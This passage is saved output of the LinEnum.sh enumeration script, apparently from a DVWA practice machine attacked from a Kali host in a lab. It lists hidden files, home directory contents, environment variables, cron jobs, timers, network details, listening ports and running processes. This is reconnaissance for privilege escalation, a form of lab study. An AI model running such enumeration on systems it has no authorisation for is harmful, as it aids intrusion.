+-rw-r--r-- 1 root root 245 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
+-rw-r--r-- 1 root root 269 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
+-rw-r--r-- 1 root root 293 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
+-rw-r--r-- 1 root root 273 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
+-rw-r--r-- 1 root root 268 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
+-rw-r--r-- 1 root root 71775 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/kernel/.asm-offsets.s.cmd
+-rw-r--r-- 1 root root 758 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/tools/.relocs_32.o.cmd
+-rw-r--r-- 1 root root 737 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/tools/.relocs_common.o.cmd
+-rw-r--r-- 1 root root 758 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/tools/.relocs_64.o.cmd
+-rw-r--r-- 1 root root 148 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/tools/.relocs.cmd
+-rw-r--r-- 1 root root 39 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/.gitignore
+-rw-rw-r-- 1 www-data www-data 500 Nov  9 03:25 /var/www/html/.htaccess
+-rw-rw-r-- 1 www-data www-data 229 Nov  9 03:25 /var/www/html/.gitignore
+-rw-r--r-- 1 landscape landscape 0 Apr 21  2021 /var/lib/landscape/.cleanup.user
+-rw------- 1 dvwa dvwa 6762 Nov 17 08:48 /home/dvwa/.bash_history
+-rw-r--r-- 1 dvwa dvwa 0 Nov  9 03:21 /home/dvwa/.sudo_as_admin_successful
+-rw-r--r-- 1 dvwa dvwa 220 Mar 19  2021 /home/dvwa/.bash_logout
+-rw------- 1 dvwa dvwa 1742 Nov  9 03:40 /home/dvwa/.viminfo
+-rw-r--r-- 1 dvwa dvwa 3771 Mar 19  2021 /home/dvwa/.bashrc
+-rw-r--r-- 1 dvwa dvwa 807 Mar 19  2021 /home/dvwa/.profile
+-rw-rw-r-- 1 dvwa dvwa 215 Nov 17 09:02 /home/dvwa/.wget-hsts
+-rw-r--r-- 1 root root 102 Mar 15  2021 /etc/cron.monthly/.placeholder
+-rw-r--r-- 1 root root 220 Mar 19  2021 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3771 Mar 19  2021 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Mar 19  2021 /etc/skel/.profile
+-rw-r--r-- 1 root root 102 Mar 15  2021 /etc/cron.weekly/.placeholder
+-rw-r--r-- 1 root root 102 Mar 15  2021 /etc/cron.daily/.placeholder
+-rw-r--r-- 1 root root 102 Mar 15  2021 /etc/cron.hourly/.placeholder
+-rw------- 1 root root 0 Apr 21  2021 /etc/.pwd.lock
+-rw-r--r-- 1 root root 102 Mar 15  2021 /etc/cron.d/.placeholder
+-rw------- 1 root root 0 Nov 17 06:55 /run/snapd/lock/.lock
+-rw-r--r-- 1 root root 20 Nov 17 06:55 /run/cloud-init/.instance-id
+-rw-r--r-- 1 root root 2 Nov 17 07:06 /run/cloud-init/.ds-identify.result
+-rw------- 1 root root 0 Sep 28 04:38 /snap/core20/1169/etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1169/etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1169/etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1169/etc/skel/.profile
+-rw------- 1 root root 0 Oct 15 04:54 /snap/core18/2246/etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/2246/etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /snap/core18/2246/etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr  4  2018 /snap/core18/2246/etc/skel/.profile
+-rw-r--r-- 1 root root 39 Oct 15 16:46 /snap/core18/2246/var/home/.gitignore
+-rw------- 1 root root 0 Mar  9  2021 /snap/core18/1997/etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/1997/etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /snap/core18/1997/etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr  4  2018 /snap/core18/1997/etc/skel/.profile
+-rw-r--r-- 1 root root 39 Mar  9  2021 /snap/core18/1997/var/home/.gitignore
+
+
+[00;31m[-] World-readable files within /home:[00m
+-rw-r--r-- 1 dvwa dvwa 0 Nov  9 03:21 /home/dvwa/.sudo_as_admin_successful
+-rw-r--r-- 1 dvwa dvwa 220 Mar 19  2021 /home/dvwa/.bash_logout
+-rw-rw-r-- 1 dvwa dvwa 140 Nov  9 04:26 /home/dvwa/your_init_file.sql
+-rw-rw-r-- 1 dvwa dvwa 27580 Nov 17 09:06 /home/dvwa/linenum-17-11-21
+-rw-r--r-- 1 dvwa dvwa 3771 Mar 19  2021 /home/dvwa/.bashrc
+-rw-r--r-- 1 dvwa dvwa 807 Mar 19  2021 /home/dvwa/.profile
+-rwxrwxr-x 1 dvwa dvwa 46631 Nov 17 09:02 /home/dvwa/LinEnum.sh
+-rw-rw-r-- 1 dvwa dvwa 215 Nov 17 09:02 /home/dvwa/.wget-hsts
+-rw-r--r-- 1 dvwa dvwa 0 Nov  9 03:21 /home/dvwa/.cache/motd.legal-displayed
+
+
+[00;31m[-] Home directory contents:[00m
+total 124K
+drwxr-x--- 4 dvwa dvwa 4.0K Nov 17 09:06 .
+drwxr-xr-x 3 root root 4.0K Nov  9 03:20 ..
+-rw------- 1 dvwa dvwa 6.7K Nov 17 08:48 .bash_history
+-rw-r--r-- 1 dvwa dvwa  220 Mar 19  2021 .bash_logout
+-rw-r--r-- 1 dvwa dvwa 3.7K Mar 19  2021 .bashrc
+drwx------ 2 dvwa dvwa 4.0K Nov  9 03:21 .cache
+-rw-rw-r-- 1 dvwa dvwa  28K Nov 17 09:06 linenum-17-11-21
+-rwxrwxr-x 1 dvwa dvwa  46K Nov 17 09:02 LinEnum.sh
+drwxrwxr-x 3 dvwa dvwa 4.0K Nov  9 03:26 .local
+-rw-r--r-- 1 dvwa dvwa  807 Mar 19  2021 .profile
+-rw-r--r-- 1 dvwa dvwa    0 Nov  9 03:21 .sudo_as_admin_successful
+-rw------- 1 dvwa dvwa 1.8K Nov  9 03:40 .viminfo
+-rw-rw-r-- 1 dvwa dvwa  215 Nov 17 09:02 .wget-hsts
+-rw-rw-r-- 1 dvwa dvwa  140 Nov  9 04:26 your_init_file.sql
+
+
+[00;33m### ENVIRONMENTAL #######################################[00m
+[00;31m[-] Environment information:[00m
+SHELL=/bin/bash
+PWD=/home/dvwa
+LOGNAME=dvwa
+XDG_SESSION_TYPE=tty
+MOTD_SHOWN=pam
+HOME=/home/dvwa
+LANG=en_US.UTF-8
+SSH_CONNECTION=192.168.1.86 44404 192.168.1.210 22
+LESSCLOSE=/usr/bin/lesspipe %s %s
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+LESSOPEN=| /usr/bin/lesspipe %s
+USER=dvwa
+SHLVL=1
+XDG_SESSION_ID=9
+XDG_RUNTIME_DIR=/run/user/1000
+SSH_CLIENT=192.168.1.86 44404 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+SSH_TTY=/dev/pts/0
+_=/usr/bin/env
+
+
+[00;31m[-] Path information:[00m
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+lrwxrwxrwx 1 root root     7 Apr 21  2021 /bin -> usr/bin
+lrwxrwxrwx 1 root root     8 Apr 21  2021 /sbin -> usr/sbin
+drwxr-xr-x 2 root root  4096 Nov 17 05:18 /snap/bin
+drwxr-xr-x 2 root root 36864 Nov 16 06:00 /usr/bin
+drwxr-xr-x 2 root root  4096 Apr 19  2021 /usr/games
+drwxr-xr-x 2 root root  4096 Apr 21  2021 /usr/local/bin
+drwxr-xr-x 2 root root  4096 Apr 21  2021 /usr/local/games
+drwxr-xr-x 2 root root  4096 Apr 21  2021 /usr/local/sbin
+drwxr-xr-x 2 root root 16384 Nov  9 04:52 /usr/sbin
+
+
+[00;31m[-] Available shells:[00m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/usr/bin/bash
+/bin/rbash
+/usr/bin/rbash
+/usr/bin/sh
+/bin/dash
+/usr/bin/dash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[00;31m[-] Current umask value:[00m
+0002
+u=rwx,g=rwx,o=rx
+
+
+[00;31m[-] umask value as specified in /etc/login.defs:[00m
+UMASK		022
+
+
+[00;31m[-] Password and storage information:[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+[00;33m### JOBS/TASKS ##########################################[00m
+[00;31m[-] Cron jobs:[00m
+-rw-r--r-- 1 root root 1132 Mar 15  2021 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Nov  9 03:22 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rw-r--r--  1 root root  201 Feb 22  2021 e2scrub_all
+-rw-r--r--  1 root root  712 Nov 18  2020 php
+-rw-r--r--  1 root root  102 Mar 15  2021 .placeholder
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 Nov  9 03:22 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rwxr-xr-x  1 root root  539 Jan 20  2021 apache2
+-rwxr-xr-x  1 root root  376 Mar 24  2021 apport
+-rwxr-xr-x  1 root root 1478 Apr 13  2021 apt-compat
+-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
+-rwxr-xr-x  1 root root  377 Feb  9  2021 logrotate
+-rwxr-xr-x  1 root root 1123 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Mar 15  2021 .placeholder
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Apr 21  2021 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rw-r--r--  1 root root  102 Mar 15  2021 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Apr 21  2021 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rw-r--r--  1 root root  102 Mar 15  2021 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Apr 21  2021 .
+drwxr-xr-x 99 root root 4096 Nov 17 07:06 ..
+-rwxr-xr-x  1 root root  813 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Mar 15  2021 .placeholder
+
+
+[00;31m[-] Crontab contents:[00m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[00;31m[-] Systemd timers:[00m
+NEXT                        LEFT                LAST                        PASSED       UNIT                           ACTIVATES
+Wed 2021-11-17 09:09:00 UTC 2min 43s left       Wed 2021-11-17 08:39:42 UTC 26min ago    phpsessionclean.timer          phpsessionclean.service
+Wed 2021-11-17 11:10:21 UTC 2h 4min left        Wed 2021-11-17 00:30:46 UTC 8h ago       fwupd-refresh.timer            fwupd-refresh.service
+Wed 2021-11-17 14:40:23 UTC 5h 34min left       Wed 2021-11-17 05:18:23 UTC 3h 47min ago motd-news.timer                motd-news.service
+Thu 2021-11-18 00:00:00 UTC 14h left            Wed 2021-11-17 00:00:46 UTC 9h ago       logrotate.timer                logrotate.service
+Thu 2021-11-18 00:00:00 UTC 14h left            Wed 2021-11-17 00:00:46 UTC 9h ago       man-db.timer                   man-db.service
+Thu 2021-11-18 01:40:53 UTC 16h left            Wed 2021-11-17 06:14:41 UTC 2h 51min ago apt-daily.timer                apt-daily.service
+Thu 2021-11-18 06:31:10 UTC 21h left            Wed 2021-11-17 07:06:12 UTC 2h 0min ago  apt-daily-upgrade.timer        apt-daily-upgrade.service
+Thu 2021-11-18 07:00:05 UTC 21h left            Wed 2021-11-17 07:00:05 UTC 2h 6min ago  update-notifier-download.timer update-notifier-download.service
+Thu 2021-11-18 07:09:42 UTC 22h left            Wed 2021-11-17 07:09:42 UTC 1h 56min ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
+Sun 2021-11-21 03:10:18 UTC 3 days left         Sun 2021-11-14 03:10:46 UTC 3 days ago   e2scrub_all.timer              e2scrub_all.service
+Mon 2021-11-22 00:46:16 UTC 4 days left         Mon 2021-11-15 00:14:46 UTC 2 days ago   fstrim.timer                   fstrim.service
+Wed 2021-11-24 23:03:37 UTC 1 weeks 0 days left Wed 2021-11-17 05:04:46 UTC 4h 1min ago  update-notifier-motd.timer     update-notifier-motd.service
+n/a                         n/a                 n/a                         n/a          snapd.snap-repair.timer        snapd.snap-repair.service
+
+13 timers listed.
+
+
+
+[00;33m### NETWORKING  ##########################################[00m
+[00;31m[-] Network and IP info:[00m
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.210  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::20c:29ff:fea4:4c49  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:a4:4c:49  txqueuelen 1000  (Ethernet)
+        RX packets 16867  bytes 5965447 (5.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3627  bytes 1637090 (1.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 238  bytes 17970 (17.9 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 238  bytes 17970 (17.9 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[00;31m[-] ARP history:[00m
+kali (192.168.1.86) at 00:0c:29:6d:5c:eb [ether] on ens160
+_gateway (192.168.1.1) at 00:11:32:dc:c4:56 [ether] on ens160
+? (192.168.1.230) at 98:06:3c:89:fd:21 [ether] on ens160
+
+
+[00;31m[-] Nameserver(s):[00m
+nameserver 127.0.0.53
+
+
+[00;31m[-] Nameserver(s):[00m
+Global
+       Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
+resolv.conf mode: stub
+
+Link 2 (ens160)
+    Current Scopes: DNS
+         Protocols: +DefaultRoute +LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
+Current DNS Server: 192.168.1.1
+       DNS Servers: 192.168.1.1
+
+
+[00;31m[-] Default route:[00m
+default         _gateway        0.0.0.0         UG    0      0        0 ens160
+
+
+[00;31m[-] Listening TCP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+
+
+[00;31m[-] Listening UDP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+
+
+[00;33m### SERVICES #############################################[00m
+[00;31m[-] Running processes:[00m
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 167660 12280 ?        Ss   06:54   0:02 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    06:54   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   06:54   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   06:54   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/0:0H-events_highpri]
+root           9  0.0  0.0      0     0 ?        I<   06:54   0:00 [mm_percpu_wq]
+root          10  0.0  0.0      0     0 ?        S    06:54   0:00 [rcu_tasks_rude_]
+root          11  0.0  0.0      0     0 ?        S    06:54   0:00 [rcu_tasks_trace]
+root          12  0.0  0.0      0     0 ?        S    06:54   0:00 [ksoftirqd/0]
+root          13  0.0  0.0      0     0 ?        I    06:54   0:01 [rcu_sched]
+root          14  0.0  0.0      0     0 ?        S    06:54   0:00 [migration/0]
+root          15  0.0  0.0      0     0 ?        S    06:54   0:00 [idle_inject/0]
+root          16  0.0  0.0      0     0 ?        S    06:54   0:00 [cpuhp/0]
+root          17  0.0  0.0      0     0 ?        S    06:54   0:00 [cpuhp/1]
+root          18  0.0  0.0      0     0 ?        S    06:54   0:00 [idle_inject/1]
+root          19  0.0  0.0      0     0 ?        S    06:54   0:00 [migration/1]
+root          20  0.0  0.0      0     0 ?        S    06:54   0:00 [ksoftirqd/1]
+root          22  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/1:0H-events_highpri]
+root          23  0.0  0.0      0     0 ?        S    06:54   0:00 [cpuhp/2]
+root          24  0.0  0.0      0     0 ?        S    06:54   0:00 [idle_inject/2]
+root          25  0.0  0.0      0     0 ?        S    06:54   0:00 [migration/2]
+root          26  0.0  0.0      0     0 ?        S    06:54   0:00 [ksoftirqd/2]
+root          28  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/2:0H-events_highpri]
+root          29  0.0  0.0      0     0 ?        S    06:54   0:00 [cpuhp/3]
+root          30  0.0  0.0      0     0 ?        S    06:54   0:00 [idle_inject/3]
+root          31  0.0  0.0      0     0 ?        S    06:54   0:00 [migration/3]
+root          32  0.0  0.0      0     0 ?        S    06:54   0:00 [ksoftirqd/3]
+root          34  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/3:0H-events_highpri]
+root          35  0.0  0.0      0     0 ?        S    06:54   0:00 [kdevtmpfs]
+root          36  0.0  0.0      0     0 ?        I<   06:54   0:00 [netns]
+root          37  0.0  0.0      0     0 ?        I<   06:54   0:00 [inet_frag_wq]
+root          38  0.0  0.0      0     0 ?        S    06:54   0:00 [kauditd]
+root          39  0.0  0.0      0     0 ?        S    06:54   0:00 [khungtaskd]
+root          40  0.0  0.0      0     0 ?        S    06:54   0:00 [oom_reaper]
+root          41  0.0  0.0      0     0 ?        I<   06:54   0:00 [writeback]
+root          42  0.0  0.0      0     0 ?        S    06:54   0:00 [kcompactd0]
+root          43  0.0  0.0      0     0 ?        SN   06:54   0:00 [ksmd]
+root          44  0.0  0.0      0     0 ?        SN   06:54   0:00 [khugepaged]
+root          91  0.0  0.0      0     0 ?        I<   06:54   0:00 [kintegrityd]
+root          92  0.0  0.0      0     0 ?        I<   06:54   0:00 [kblockd]
+root          93  0.0  0.0      0     0 ?        I<   06:54   0:00 [blkcg_punt_bio]
+root          94  0.0  0.0      0     0 ?        I<   06:54   0:00 [tpm_dev_wq]
+root          95  0.0  0.0      0     0 ?        I<   06:54   0:00 [ata_sff]
+root          96  0.0  0.0      0     0 ?        I<   06:54   0:00 [md]
+root          97  0.0  0.0      0     0 ?        I<   06:54   0:00 [edac-poller]
+root          98  0.0  0.0      0     0 ?        I<   06:54   0:00 [devfreq_wq]
+root          99  0.0  0.0      0     0 ?        S    06:54   0:00 [watchdogd]
+root         101  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/0:1H-kblockd]
+root         104  0.0  0.0      0     0 ?        I    06:54   0:00 [kworker/2:1-mm_percpu_wq]
+root         105  0.0  0.0      0     0 ?        S    06:54   0:00 [kswapd0]
+root         106  0.0  0.0      0     0 ?        S    06:54   0:00 [ecryptfs-kthrea]
+root         108  0.0  0.0      0     0 ?        I<   06:54   0:00 [kthrotld]
+root         109  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/24-pciehp]
+root         110  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/25-pciehp]
+root         111  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/26-pciehp]
+root         112  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/27-pciehp]
+root         113  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/28-pciehp]
+root         114  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/29-pciehp]
+root         115  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/30-pciehp]
+root         116  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/31-pciehp]
+root         117  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/32-pciehp]
+root         118  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/33-pciehp]
+root         119  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/34-pciehp]
+root         120  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/35-pciehp]
+root         121  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/36-pciehp]
+root         122  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/37-pciehp]
+root         123  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/38-pciehp]
+root         124  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/39-pciehp]
+root         125  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/40-pciehp]
+root         126  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/41-pciehp]
+root         127  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/42-pciehp]
+root         128  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/43-pciehp]
+root         129  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/44-pciehp]
+root         130  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/45-pciehp]
+root         131  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/46-pciehp]
+root         132  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/47-pciehp]
+root         133  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/48-pciehp]
+root         134  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/49-pciehp]
+root         135  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/50-pciehp]
+root         136  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/51-pciehp]
+root         137  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/52-pciehp]
+root         138  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/53-pciehp]
+root         139  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/54-pciehp]
+root         140  0.0  0.0      0     0 ?        S    06:54   0:00 [irq/55-pciehp]
+root         141  0.0  0.0      0     0 ?        I<   06:54   0:00 [acpi_thermal_pm]
+root         142  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_0]
+root         143  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_0]
+root         144  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_1]
+root         145  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_1]
+root         147  0.0  0.0      0     0 ?        I<   06:54   0:00 [vfio-irqfd-clea]
+root         149  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/3:1H-kblockd]
+root         150  0.0  0.0      0     0 ?        I<   06:54   0:00 [ipv6_addrconf]
+root         159  0.0  0.0      0     0 ?        I<   06:54   0:00 [kstrp]
+root         162  0.0  0.0      0     0 ?        I<   06:54   0:00 [zswap-shrink]
+root         163  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/u9:0]
+root         168  0.0  0.0      0     0 ?        I<   06:54   0:00 [charger_manager]
+root         191  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/2:1H-kblockd]
+root         219  0.0  0.0      0     0 ?        I<   06:54   0:00 [mpt_poll_0]
+root         220  0.0  0.0      0     0 ?        I<   06:54   0:00 [mpt/0]
+root         226  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_2]
+root         227  0.0  0.0      0     0 ?        I<   06:54   0:00 [cryptd]
+root         231  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_2]
+root         232  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_3]
+root         234  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_3]
+root         237  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_4]
+root         238  0.0  0.0      0     0 ?        I<   06:54   0:00 [kworker/1:1H-kblockd]
+root         241  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_4]
+root         244  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_5]
+root         245  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_5]
+root         247  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_6]
+root         248  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_6]
+root         249  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_7]
+root         250  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_7]
+root         251  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_8]
+root         252  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_8]
+root         253  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_9]
+root         254  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_9]
+root         255  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_10]
+root         256  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_10]
+root         257  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_11]
+root         258  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_11]
+root         259  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_12]
+root         260  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_12]
+root         261  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_13]
+root         262  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_13]
+root         263  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_14]
+root         264  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_14]
+root         265  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_15]
+root         266  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_15]
+root         267  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_16]
+root         268  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_16]
+root         269  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_17]
+root         270  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_17]
+root         271  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_18]
+root         272  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_18]
+root         273  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_19]
+root         274  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_19]
+root         275  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_20]
+root         276  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_20]
+root         277  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_21]
+root         278  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_21]
+root         279  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_22]
+root         280  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_22]
+root         281  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_23]
+root         282  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_23]
+root         283  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_24]
+root         284  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_24]
+root         285  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_25]
+root         286  0.0  0.0      0     0 ?        I<   06:54   0:00 [scsi_tmf_25]
+root         287  0.0  0.0      0     0 ?        S    06:54   0:00 [scsi_eh_26]
